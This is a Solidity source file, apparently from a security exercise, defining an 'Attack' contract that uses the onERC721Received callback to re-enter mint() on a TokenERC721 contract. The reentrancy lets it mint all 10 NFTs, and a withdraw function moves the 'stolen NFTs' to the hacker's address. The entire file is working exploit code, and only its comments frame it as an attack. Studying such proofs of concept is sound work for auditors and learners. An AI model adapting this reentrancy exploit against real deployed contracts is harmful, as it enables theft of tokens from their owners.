// SPDX-License-Identifier: NONE
pragma solidity ^0.8.15;

import { TokenERC721 } from "../src/TokenERC721.sol";
import "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";

contract Attack is IERC721Receiver {
    TokenERC721 public token;

    constructor() { 
        token = new TokenERC721();
    }

    // Performs the attack allowing to mint all of the 10 NFTs on the Token contract
    function mintAttack() public {
        if (token.totalSupply() < 10) {
            token.mint();
        }
    }

    // This function is used to transfer the stolen NFTs from the Attack contract to the hacker EOA address
    function withdraw(address from, address to, uint256 tknID) public {
        token.transferFrom(from, to, tknID);
    }

    // This callback function is triggered after each mint and it is used f
    // for the reentrancy attack originated by the mintAttack() function.
    function onERC721Received( address operator, address from, uint256 tokenId, bytes calldata data ) public override returns (bytes4) {
        // reentrancy attack
        mintAttack();
        return this.onERC721Received.selector;
    }

    // Helper functions - to obtain data from the Token Contract
    function getTokenBalanceOf(address addr) public view returns (uint256 balance){
        return token.balanceOf(addr);
    }

    function getTokenTotalSupply() public view returns (uint256 supply){
        return token.totalSupply();
    }

    function getownerOf(uint256 tokenId) public view returns (address owner) {
        return token.ownerOf(tokenId);
    }
}